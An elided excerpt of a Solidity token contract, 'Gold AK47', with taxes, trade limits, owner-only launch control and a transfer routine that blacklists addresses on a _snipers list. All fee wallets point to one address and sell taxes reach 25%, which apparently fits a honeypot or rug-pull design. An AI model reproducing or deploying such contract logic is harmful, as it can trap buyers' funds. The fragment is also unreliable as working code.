...
contract GoldAK47 is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 30 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public swapTokensAtAmount = 150000000;
    uint256 public maxBuyLimit = 600000000;
    uint256 public maxSellLimit = 300000000;
    uint256 public maxWalletLimit = 600000000;
    
    uint256 private asTime;
    uint256 private tTimer;
    
    address public marketingWallet =0xc09ff0285b6C8DA1f21f9479a4f3f7e5F3ae9BA9;
    address public devWallet = 0xc09ff0285b6C8DA1f21f9479a4f3f7e5F3ae9BA9; 
    address public operationWallet = 0xc09ff0285b6C8DA1f21f9479a4f3f7e5F3ae9BA9;
    address public charityWallet = 0xc09ff0285b6C8DA1f21f9479a4f3f7e5F3ae9BA9; 

    string private constant _name = "Gold AK47";
    string private constant _symbol = "GOLDAK47"; 
    ...
    Taxes public taxes = Taxes(0, 6, 1, 1, 0, 0);
    Taxes public sellTaxes = Taxes(0, 10, 5, 10, 0, 0);
    ...
    constructor (uint256 antiSnipeSeconds) {
    ...
    function _launch(bool state) external onlyOwner{
        tradingEnabled = state;
        swapEnabled = state;
        tTimer = block.timestamp + asTime;
    }

    function fishingSpree() public view returns (uint){
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(block.timestamp > tTimer){
            for(uint i = 0 ; i < _snipers.length ; i++){
                _isBlacklisted[_snipers[i]] = true;
            }
        }
